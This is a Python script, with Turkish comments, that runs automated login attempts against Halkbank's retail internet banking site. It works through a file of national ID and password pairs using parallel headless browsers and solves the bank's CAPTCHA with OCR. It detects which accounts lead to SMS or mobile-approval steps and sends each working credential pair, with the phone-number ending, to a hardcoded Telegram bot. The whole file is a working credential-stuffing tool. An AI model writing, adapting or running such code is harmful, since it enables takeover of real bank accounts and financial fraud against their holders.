from pathlib import Path
from urllib.parse import urlsplit, urlencode
import urllib.request
import sys
import time
import threading
import queue
from playwright.sync_api import sync_playwright

try:
    import ddddocr
    HAS_OCR = True
except ImportError:
    HAS_OCR = False

ROOT = Path(__file__).resolve().parent
BILGILER_FILE = ROOT / 'bilgiler.txt'
URL = 'https://sube.halkbank.com.tr/InternetBankingHost/HostLogin?CustomerType=Retail'

# Ayarlar:
HEADLESS = True            # Tarayiciyi gosterme (Arka planda gizli calisir)
AUTO_SUBMIT = True         # CAPTCHA doldurulduktan sonra otomatik Giris dugmesine basilsin mi
AUTO_SUBMIT_DELAY = 0      # Giris dugmesine basmadan once bekleme suresi (0 = aninda basar)

# Telegram Ayarlari:
TG_BOT_TOKEN = '8227836330:AAGDgPLPs2DIdusrL9WTNiURZZkBW758xFc'
TG_CHAT_ID = '-1004392278150'

OCR_ENGINE = ddddocr.DdddOcr(beta=True, show_ad=False) if HAS_OCR else None
OCR_LOCK = threading.Lock()
FILE_LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()


def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)


def send_telegram(tc, password, phone_end=None):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return
    try:
        msg = (
            f"✅ [BAŞARILI] Giriş Algılandı!\n\n"
            f"👤 TC: {tc}\n"
            f"🔑 Parola: {password}"
        )
        if phone_end:
            msg += f"\n📱 {phone_end} NUMARASI SONU"
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        data = urlencode({'chat_id': TG_CHAT_ID, 'text': msg}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method='POST')
        with urllib.request.urlopen(req, timeout=10) as resp:
            if resp.status == 200:
                safe_print(f'[{tc}] Telegram bildirimi basariyla gonderildi!')
    except Exception as e:
        safe_print(f'[{tc}] Telegram bildirim hatasi: {e}')



def load_accounts():
    if not BILGILER_FILE.exists():
        raise FileNotFoundError('bilgiler.txt dosyasi bulunamadi.')
    raw_lines = BILGILER_FILE.read_text(encoding='utf-8-sig').splitlines()
    accounts = []
    for line in raw_lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if ':' not in line:
            continue
        tc, password = line.split(':', 1)
        tc = tc.strip()
        password = password.strip()
        if tc.isdigit() and len(tc) == 11 and password:
            accounts.append((tc, password))

    if not accounts:
        raise ValueError('bilgiler.txt dosyasinda en az bir adet gecerli "TC:PAROLA" satiri bulunmalidir.')
    return accounts


def remove_account_from_file(tc, password):
    """Gercekten denenen hesabi bilgiler.txt dosyasindan guvenli (atomic) sekilde siler."""
    with FILE_LOCK:
        try:
            if not BILGILER_FILE.exists():
                return
            lines = BILGILER_FILE.read_text(encoding='utf-8-sig').splitlines()
            new_lines = []
            removed = False
            for line in lines:
                stripped = line.strip()
                if not removed and ':' in stripped and not stripped.startswith('#'):
                    l_tc, l_pass = stripped.split(':', 1)
                    if l_tc.strip() == tc and l_pass.strip() == password:
                        removed = True
                        continue
                new_lines.append(line)
            if removed:
                tmp_file = BILGILER_FILE.with_suffix('.tmp')
                tmp_file.write_text('\n'.join(new_lines) + ('\n' if new_lines else ''), encoding='utf-8')
                tmp_file.replace(BILGILER_FILE)
        except Exception as e:
            safe_print(f'[{tc}] bilgiler.txt silme hatasi: {e}')


def solve_captcha(page, worker_id, tc):
    """
    Halkbank BotDetect guvenlik kodunu ddddocr beta modeli ile cozer.
    """
    if not HAS_OCR or OCR_ENGINE is None:
        return None

    captcha_img = page.locator('#HalkbankLoginCaptchaRetail_CaptchaImage')

    for attempt in range(1, 5):
        try:
            captcha_img.wait_for(state='visible', timeout=5000)
            img_bytes = captcha_img.screenshot()
            with OCR_LOCK:
                raw_text = OCR_ENGINE.classification(img_bytes).strip().upper()
            code = ''.join(c for c in raw_text if c.isalnum())

            # Halkbank guvenlik kodlari her zaman 5 hanelidir
            if len(code) == 5:
                return code
            else:
                page.eval_on_selector('#HalkbankLoginCaptchaRetail_ReloadIcon', 'el => el.click()')
                page.wait_for_timeout(500)
        except Exception as e:
            safe_print(f'[Tarayici-{worker_id} | {tc}] CAPTCHA cozme hatasi: {e}')
            break

    return code if 'code' in locals() and code else None


def worker_loop(worker_id, task_queue, total_count):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=HEADLESS)
        context = browser.new_context(locale='tr-TR')
        page = context.new_page()
        try:
            while True:
                try:
                    idx, tc, password = task_queue.get_nowait()
                except queue.Empty:
                    break

                safe_print(f'[Tarayici-{worker_id}] ({idx}/{total_count}) {tc} deneniyor...')
                account_tested = False

                try:
                    page.goto(URL, wait_until='domcontentloaded', timeout=60000)
                    if urlsplit(page.url).hostname != 'sube.halkbank.com.tr':
                        safe_print(f'[Tarayici-{worker_id} | {tc}] Beklenen resmi banka adresi acilmadi (Silinmedi, tekrar denenecek).')
                        task_queue.put((idx, tc, password))
                        continue

                    user = page.locator('#PinLoginCustomerID')
                    secret = page.locator('#frmFirstLogin input[name="FirstLoginPasswordNotEncrypt"]')
                    user.wait_for(state='visible', timeout=25000)
                    secret.wait_for(state='visible', timeout=25000)

                    form = page.locator('#frmFirstLogin')
                    captcha_input = form.locator('#captcha-input')
                    submit_btn = form.locator('#submitbtn')

                    # 1. TC Kimlik Numarasini doldur
                    user.fill(tc)

                    # 2. CAPTCHA'yi PAROLAYA DOKUNMADAN ONCE COZ
                    code = solve_captcha(page, worker_id, tc)
                    if code:
                        captcha_input.fill(code)
                    else:
                        safe_print(f'[Tarayici-{worker_id} | {tc}] CAPTCHA okunamadi, tekrar denenecek (Silinmedi)...')
                        task_queue.put((idx, tc, password))
                        continue

                    # 3. Parolayi doldur
                    secret.fill(password)

                    # 4. Sanal klavyeyi gizle ve aninda Giris'e bas
                    try:
                        page.evaluate('() => document.querySelectorAll(".ui-keyboard").forEach(el => el.style.display = "none")')
                    except Exception:
                        pass

                    # 5. Otomatik Giris (Beklemeden Aninda)
                    if AUTO_SUBMIT and code:
                        if AUTO_SUBMIT_DELAY > 0:
                            time.sleep(AUTO_SUBMIT_DELAY)
                        submit_btn.click(force=True)

                    # 6. Yaniti ve Hata Durumunu Anlik Kontrol Et
                    is_success = False
                    has_error = False
                    err_message = ''
                    phone_end = None

                    for _ in range(40):
                        page.wait_for_timeout(150)

                        try:
                            state = page.evaluate('''() => {
                                const bodyText = document.body ? document.body.innerText : "";
                                
                                // Ekranda **241 veya *** 241 gibi maskeli telefon numarasi var mi kontrol et
                                let phoneEnd = null;
                                const phoneMatch = bodyText.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                if (phoneMatch && phoneMatch[1]) {
                                    phoneEnd = phoneMatch[1];
                                } else {
                                    const inputs = document.querySelectorAll("input, label, span, p, div");
                                    for (const el of inputs) {
                                        const val = (el.value || el.innerText || "").trim();
                                        const m = val.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                        if (m && m[1]) {
                                            phoneEnd = m[1];
                                            break;
                                        }
                                    }
                                }
                                
                                if (
                                    bodyText.includes("Mobil Onay ile Giriş") ||
                                    bodyText.includes("Mobil Onay") ||
                                    bodyText.includes("SMS Şifresi") ||
                                    bodyText.includes("SMS Onay") ||
                                    bodyText.includes("Doğrulama Kodu") ||
                                    phoneEnd !== null
                                ) {
                                    return { status: "success", msg: "", phone: phoneEnd };
                                }
                                const selectors = [
                                    ".alert-danger", ".validation-summary-errors", ".field-validation-error",
                                    ".error-message", ".modal-body", ".bootbox-body", ".swal2-content",
                                    ".ui-dialog-content", "#errorDiv", ".login-error", ".warning-text"
                                ];
                                for (const sel of selectors) {
                                    const els = document.querySelectorAll(sel);
                                    for (const el of els) {
                                        if (el.offsetParent !== null) {
                                            const t = el.innerText.trim();
                                            if (t.length > 3) return { status: "error", msg: t, phone: null };
                                        }
                                    }
                                }
                                const errKeywords = [
                                    "hatalı", "hatali", "yanlış", "yanlis", "geçersiz", "gecersiz",
                                    "başarısız", "basarisiz", "kontrol ediniz", "tekrar deneyiniz",
                                    "bloke", "uyuşmamaktadır", "bulunamadı", "eksik"
                                ];
                                const lower = bodyText.toLowerCase();
                                for (const kw of errKeywords) {
                                    if (lower.includes(kw)) {
                                        return { status: "error", msg: "Banka hata uyarisi (" + kw + ")", phone: null };
                                    }
                                }
                                const pinInput = document.querySelector("#PinLoginCustomerID");
                                if (pinInput && pinInput.offsetParent !== null && pinInput.value === "") {
                                    return { status: "error", msg: "Form sifirlandi (Sifre veya kod yanlis)", phone: null };
                                }
                                return { status: "pending", msg: "", phone: null };
                            }''')

                            if state['status'] == 'success':
                                is_success = True
                                phone_end = state.get('phone')
                                if not phone_end:
                                    page.wait_for_timeout(200)
                                    try:
                                        phone_end = page.evaluate('''() => {
                                            const txt = document.body ? document.body.innerText : "";
                                            const m = txt.match(/\\*{2,}[\\s\\*]*(\\d{2,4})/);
                                            return m && m[1] ? m[1] : null;
                                        }''')
                                    except Exception:
                                        pass
                                break
                            elif state['status'] == 'error':
                                has_error = True
                                err_message = state['msg']
                                break
                        except Exception:
                            pass

                    # Sadece guvenlik kodu yanlis girildiyse hesabi silme, kuyruga geri koy
                    err_lower = err_message.lower()
                    is_captcha_wrong = any(k in err_lower for k in ['güvenlik kodu', 'guvenlik kodu', 'resimdeki', 'doğrulama kodu hatalı', 'dogrulama kodu hatali'])

                    if is_success:
                        account_tested = True
                        if phone_end:
                            safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> {phone_end} NUMARASI SONU')
                        else:
                            safe_print(f'✅ [BASARILI | Tarayici-{worker_id}] {tc}:{password} -> Mobil Onay Algilandi!')
                        send_telegram(tc, password, phone_end)
                    elif has_error and is_captcha_wrong:
                        safe_print(f'🔄 [CAPTCHA HATALI | Tarayici-{worker_id}] {tc} -> Guvenlik kodu yanlis okundu, hesap silinmedi tekrar denenecek.')
                        task_queue.put((idx, tc, password))
                    elif has_error:
                        account_tested = True
                        safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> {err_message}')
                    else:
                        account_tested = True
                        safe_print(f'❌ [HATALI | Tarayici-{worker_id}] {tc} -> Giris basarisiz oldu.')

                except Exception as e:
                    safe_print(f'[Tarayici-{worker_id} | {tc}] Baglanti/Sayfa hatasi (Hesap silinmedi!): {e}')
                    time.sleep(2)

                finally:
                    # SADECE gercekten denenen hesabi bilgiler.txt dosyasindan sil
                    if account_tested:
                        remove_account_from_file(tc, password)

                    # Oturum verilerini temizle
                    try:
                        context.clear_cookies()
                        page.evaluate('() => { localStorage.clear(); sessionStorage.clear(); }')
                    except Exception:
                        pass

                    task_queue.task_done()
        finally:
            browser.close()


def main():
    check = '--check' in sys.argv
    if check:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.goto(URL, wait_until='domcontentloaded', timeout=60000)
            print('Resmi giris sayfasi dogrulandi.')
            browser.close()
        return

    accounts = load_accounts()
    total_count = len(accounts)
    print(f'Toplam {total_count} hesap bilgisi bilgiler.txt dosyasindan yuklendi.')

    try:
        raw_input = input('Kac tarayici ile acilsin? (Ornek: 1, 3, 5): ').strip()
        num_browsers = int(raw_input) if raw_input else 1
        if num_browsers < 1:
            num_browsers = 1
    except ValueError:
        num_browsers = 1

    num_browsers = min(num_browsers, total_count)
    print(f'\n{num_browsers} adet gizli tarayici (arka planda) baslatiliyor...')
    print('Denenen her hesap aninda bilgiler.txt dosyasindan silinecektir.\n')

    task_queue = queue.Queue()
    for idx, (tc, password) in enumerate(accounts, start=1):
        task_queue.put((idx, tc, password))

    threads = []
    for w_id in range(1, num_browsers + 1):
        t = threading.Thread(
            target=worker_loop,
            args=(w_id, task_queue, total_count),
            daemon=True
        )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print('\nListedeki tum hesaplar denendi ve bilgiler.txt dosyasindan temizlendi!')


if __name__ == '__main__':
    try:
        main()
    except (ValueError, FileNotFoundError) as exc:
        print(str(exc))
        sys.exit(1)
    except KeyboardInterrupt:
        print('\nIslem kullanici tarafindan durduruldu.')
        sys.exit(0)
    except Exception as exc:
        print(f'Baglanti veya sayfa hatasi: {exc}')
        sys.exit(1)

